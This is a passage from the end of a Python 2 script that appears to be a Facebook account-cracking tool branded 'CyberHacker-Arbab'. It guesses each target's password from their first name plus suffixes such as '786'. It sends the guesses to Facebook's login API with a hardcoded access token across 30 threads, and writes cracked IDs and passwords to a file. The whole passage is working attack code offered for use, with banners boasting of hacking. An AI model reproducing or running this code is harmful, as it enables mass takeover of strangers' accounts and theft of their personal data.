				                                                                                       print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass8 + '\n'
				                                                                                       cek = open("out/super_cp.txt", "a")
				                                                                                       cek.write("ID:" +user+ " Pw:" +pass8+"\n")
				                                                                                       cek.close()
				                                                                                       cekpoint.append(user+pass8)   	
										                                   else:					
										                                       pass9 = b['first_name'] + '786'					
										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
										                                       q = json.load(data)				
										                                       if 'access_token' in q:		
		                                                                                                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                               z = json.loads(x.text)
											                                       print '\x1b[1;94m[  ✓  ] \x1b[1;92mArbab-Hack100%'			
											                                       print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']			
											                                       print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user	
											                                       print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass9 + '\n'			
											                                       oks.append(user+pass9)
                                                                                                                       else:
			                                                                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                                                                   print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
				                                                                                                   print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
				                                                                                                   print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
				                                                                                                   print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass9 + '\n'
				                                                                                                   cek = open("out/super_cp.txt", "a")
				                                                                                                   cek.write("ID:" +user+ " Pw:" +pass9+"\n")
				                                                                                                   cek.close()
				                                                                                                   cekpoint.append(user+pass9)		
											                                       
																	
															
					
 except:	
         pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;95m•◈•▬ ▬ ▬•◈\033[1;91mSHAHZADA-ARBAB\033[1;95m◈•▬ ▬ ▬•◈•"
	print "  \033[1;91m«---•◈•---Developed By CyberHacker-Arbab--•◈•---»" #Dev:Arbab
	print '\033[1;93m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 Arbab.py)↩\033[1;97m....'
	print"\033[1;91mTotal OK/\x1b[1;95mCP \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
	print """


░█████╗░██████╗░██████╗░░█████╗░██████╗░
██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔══██╗
███████║██████╔╝██████╦╝███████║██████╦╝
██╔══██║██╔══██╗██╔══██╗██╔══██║██╔══██╗
██║░░██║██║░░██║██████╦╝██║░░██║██████╦╝
╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝╚═════╝░
 
         Checkpoint ID Open After 7 Days In Facebook Lite 
•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
: \033[1;91m ..CyberHacker-Arbab Creations.. \033[1;95m :
•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                Checkpoint ID Open After 7 Days In Facebook Lite 
•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
: \033[1;91m ..CyberHacker-Arbab Creations.. \033[1;95m :
•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                Facebook
              \033[1;91mCYBER-HACKER-SHAHZADA-ARBAB"""
	
	
	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
	menu()

if __name__ == '__main__':
	login()

	
